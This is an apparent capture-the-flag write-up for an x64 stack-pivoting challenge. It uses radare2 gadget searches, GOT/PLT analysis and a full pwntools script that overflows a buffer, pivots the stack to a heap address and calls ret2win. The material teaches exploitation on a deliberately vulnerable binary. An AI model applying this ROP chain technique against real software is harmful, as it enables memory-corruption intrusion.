# pivot

## x64 (x86_64)

I've skipped a few of the challenges because I was interested about stack pivoting

This one feaures stack pivoting, useful in cases where the initial chain is limited in size or you need to pivot onto a chain already written elsewhere in memory.

This challenge imports a function named foothold_function() from a library that also contains a ret2win() function. I'll need to find the `.got.plt` entry of `foothold_functon()` and add the offset of `ret2win()` to get the actual address. `foothold_function()` will also need to be called first to update its `.got.plt` entry.

The program helps a lot with all of this. The goal ends up being to pivot the stack using a ROP chain to a given heap address, leak the addresses of library functions, and call `ret2win()` which prints the flag. The process is:

* stack smash 
* stack pivot
* leak the address of `foothold_function()` in libpivot and calculate offset for `ret2win()`
* call `ret2win()`


First we need to smash the stack. We can use `ragg2` to generate a payload to find the offset.

```sh
ragg2 -P 100 -r > fuzzing.txt
```

now if we use gdb and enter in the fuzzing payload when the stack smash is prompted, we hit a segfault and see that `rsp` points to `AAOAAPAAQAARAASAATAAUAAV` which after comparing to the fuzzing payload, occurs after 40 characters. After these 40 characters, we will overflow into the instruction pointer.

Now onto the stack pivot. We need some gadgets


```sh
r2 pivot
 -- Control the height of the terminal on serial consoles with e scr.height
[0x00400760]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze all functions arguments/locals
[0x00400760]> f~+gadget
0x004009bb 0 loc.usefulGadgets
[0x00400760]> pd 8@loc.usefulGadgets
            ;-- usefulGadgets:
            0x004009bb      58             pop rax
            0x004009bc      c3             ret
            0x004009bd      4894           xchg rsp, rax
            0x004009bf      c3             ret
            0x004009c0      488b00         mov rax, qword [rax]
            0x004009c3      c3             ret
            0x004009c4      4801e8         add rax, rbp
            0x004009c7      c3             ret
```

The first two seem useful: pop a value into rax then xchg that with rsp. Given this, the ROP chain now looks like:

* payload of 40 chars
* pop rax
* heap addr (pop heap addr into rax)
* xchg rsp rax (xchg the heap addr into the stack pointer)

Now to get the libc address leak. We can find the relative offset between the `foothold_functon()` and `ret2win()` using r2:

```sh
r2 libpivot.so 
Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
 -- Use hasher to calculate hashes of portion blocks of a file
[0x00000890]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze all functions arguments/locals
[0x00000890]> ? sym.ret2win - sym.foothold_function
int32   279
uint32  279
hex     0x117
octal   0427
unit    279
segment 0000:0117
string  "\x17\x01"
fvalue  279.0
float   0.000000f
double  0.000000
binary  0b0000000100010111
ternary 0t101100
```

So the `ret2win()` function can be reached by adding 0x117 to the `foothold_function()` address. Now to find the addresses within the GOT


```sh
r2 pivot      
 -- Use 'zoom.byte=printable' in zoom mode ('z' in Visual mode) to find strings
[0x00400760]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze all functions arguments/locals
[0x00400760]> afl
0x00400760    1 42           entry0
0x004006a0    3 23           sym._init
0x00400a44    1 9            sym._fini
0x004007a0    4 42   -> 37   sym.deregister_tm_clones
0x004007d0    4 58   -> 55   sym.register_tm_clones
0x00400810    3 34   -> 29   sym.__do_global_dtors_aux
0x00400840    1 7            entry.init0
0x004008f1    1 183          sym.pwnme
0x00400700    1 6            sym.imp.memset
0x004006e0    1 6            sym.imp.puts
0x004006f0    1 6            sym.imp.printf
0x00400710    1 6            sym.imp.read
0x004009a8    1 19           sym.uselessFunction
0x00400720    1 6            sym.imp.foothold_function
0x00400750    1 6            sym.imp.exit
0x00400a40    1 2            sym.__libc_csu_fini
0x004009d0    4 101          sym.__libc_csu_init
0x00400790    1 2            sym._dl_relocate_static_pie
0x00400847    3 170          main
0x00400740    1 6            sym.imp.setvbuf
0x00400730    1 6            sym.imp.malloc
0x004006d0    1 6            sym.imp.free
[0x00400760]> pdf @ sym.imp.foothold_function
            ; CALL XREF from sym.uselessFunction @ 0x4009ac(x)
┌ 6: sym.imp.foothold_function ();
│ rg: 0 (vars 0, args 0)
│ bp: 0 (vars 0, args 0)
│ sp: 0 (vars 0, args 0)
└           0x00400720      ff251a092000   jmp qword [reloc.foothold_function] ; [0x601040:8]=0x400726 ; "&\a@"
[0x00400760]> ir
[Relocations]

vaddr      paddr      type   name
―――――――――――――――――――――――――――――――――
0x00600ff0 0x00000ff0 SET_64 __libc_start_main
0x00600ff8 0x00000ff8 SET_64 __gmon_start__
0x00601018 0x00001018 SET_64 free
0x00601020 0x00001020 SET_64 puts
0x00601028 0x00001028 SET_64 printf
0x00601030 0x00001030 SET_64 memset
0x00601038 0x00001038 SET_64 read
0x00601040 0x00001040 SET_64 foothold_function
0x00601048 0x00001048 SET_64 malloc
0x00601050 0x00001050 SET_64 setvbuf
0x00601058 0x00001058 SET_64 exit
0x00601070 0x00601070 ADD_64 stdout


12 relocations

```

So we have:

* `foothold_function()` address in PLT: 0x00400720
* `foothold_function()` address in GOT: 0x00601040


Uing the `foothold_function()` PLT address we can call it so the GOT entry is filled. Now we need to construct a ROP chain in this new pivoted stack, which will move the `foothold_function()` GOT entry into a register and add the found offset to reach the `ret2win()` address and call it. Thats the win condition.

Lets find the gadgets in r2

```sh
[0x00400760]> /R pop rax
  0x004009bb                 58  pop rax
  0x004009bc                 c3  ret
[0x00400760]> /R mov rax
  0x004009c0             488b00  mov rax, qword [rax]
  0x004009c3                 c3  ret
[0x00400760]> /R add rax
  0x004009c4             4801e8  add rax, rbp
  0x004009c7                 c3  ret
[0x00400760]> /R pop rbp
  0x004007c8                 5d  pop rbp
  0x004007c9                 c3  ret
[0x00400760]> /R call rax
  0x004006b0               ffd0  call rax
```

This ROP chain now looks like:

* call `foothold_function()` in PLT
* `pop rax; ret`
* pop `foothold_function()` in GOT into rax
* `mov rax; ret`
* `pop rbp; ret`
* add 0x117 bytes to get `ret2win()` to the rbp
* `add rax; ret`
* `call rax`

In total the solution script is:

```py
binary = ELF("./pivot")
libc = ELF("./libpivot.so")
context.binary = binary

p = process(binary.path)

# addresses
pop_rax = 0x004009bb
xchg_rsp_rax = 0x004009bd

foothold_plt = 0x00400720
foothold_got = 0x00601040

mov_rax = 0x004009c0
add_rax = 0x004009c4
pop_rbp = 0x004007c8
call_rax = 0x004006b0

#pid = util.proc.pidof(p)[0]
#print(f"the pid is {pid}")
#util.proc.wait_for_debugger(pid)

p.recvuntil(b"The Old Gods kindly bestow upon you a place to pivot:")
raw_heap_addr = p.recvline().strip().decode("utf-8")
heap_addr = u64(unhex(raw_heap_addr[2:]).rjust(8, b"\x00"), endian="big")

log.info(f"heap address: {hex(heap_addr)}")

ret2win_offset = libc.sym["ret2win"] - libc.sym["foothold_function"]
# could do this way or the other way
#foothold_plt = p.elf.plt["foothold_function"]
#foothold_got = p.elf.got["foothold_function"]


stage2 = p64(foothold_plt)
stage2 += p64(pop_rax)
stage2 += p64(foothold_got)
stage2 += p64(mov_rax)
stage2 += p64(pop_rbp)
stage2 += p64(ret2win_offset)
stage2 += p64(add_rax)
stage2 += p64(call_rax)

# pivoted rop chain to heap address
p.recvuntil(b"> ")
p.sendline(stage2)

# stack smash
p.recvuntil(b"> ")

stage1 = b"A" * 40
stage1 += p64(pop_rax)
stage1 += p64(heap_addr)
stage1 += p64(xchg_rsp_rax)
p.sendline(stage1)

print(p.recvall())
```